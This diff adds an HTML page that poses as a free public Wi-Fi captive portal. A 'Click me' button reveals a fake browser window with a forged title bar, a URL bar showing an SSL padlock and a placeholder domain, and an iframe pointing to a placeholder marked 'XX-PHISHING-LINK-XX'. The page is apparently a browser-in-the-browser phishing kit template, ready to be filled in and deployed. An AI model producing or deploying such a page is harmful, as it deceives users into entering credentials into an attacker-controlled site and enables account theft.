@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">
+	<link rel="stylesheet" href="style2.css">
+	<link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+<div class="captive-wrapper">
+    <div class="captive-card">
+        <div class="captive-header">
+            <svg viewBox="0 0 24 24" width="48" height="48" stroke="currentColor" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round" class="wifi-icon"><path d="M5 12.55a11 11 0 0 1 14.08 0"></path><path d="M1.42 9a16 16 0 0 1 21.16 0"></path><path d="M8.53 16.11a6 6 0 0 1 6.95 0"></path><line x1="12" y1="20" x2="12.01" y2="20"></line></svg>
+            <h1>Free Public Wi-Fi</h1>
+        </div>
+        
+        <div class="captive-body">
+            <p>Welcome to our high-speed guest network. To ensure a safe and secure browsing experience, please authenticate to continue.</p>
+            
+            <div class="terms-box">
+                By connecting to this network, you agree to our <a href="javascript:void(0);">Terms of Service</a> and <a href="javascript:void(0);">Acceptable Use Policy</a>. Network traffic may be monitored for security and diagnostic purposes.
+            </div>
+        </div>
+        
+        <div class="captive-footer">
+            <button id="clickme" class="btn-connect">Click me</button>
+        </div>
+    </div>
+</div>
+
+<div id="window" style="margin:auto; position: relative; bottom: 2.5%; display: none;">
+<div id="title-bar-width">
+	<div id="title-bar">
+		<div style="margin-top:5px;">
+			<img src="XX-LOGO-XX" width="20px" height="20px" id="logo">
+			<span id="logo-description">XX-TITLE-XX</span>
+		</div>
+
+		<div>
+			<span id="minimize">&#8212;</span>
+			<span id="square">&#9633;</span>
+			<span id="exit">&#10005;</span>
+		</div>
+	</div>
+	<div id="url-bar">
+		<img src="./ssl.svg" width="20px" height="20px" id="ssl-padlock">
+		<span id="domain-name">XX-DOMAIN-NAME-XX</span>
+	</div>
+</div>
+<iframe id="content" src="XX-PHISHING-LINK-XX" frameBorder="0"></iframe>
+</div>
+<script src="script.js"></script>
+</body>
+</html>
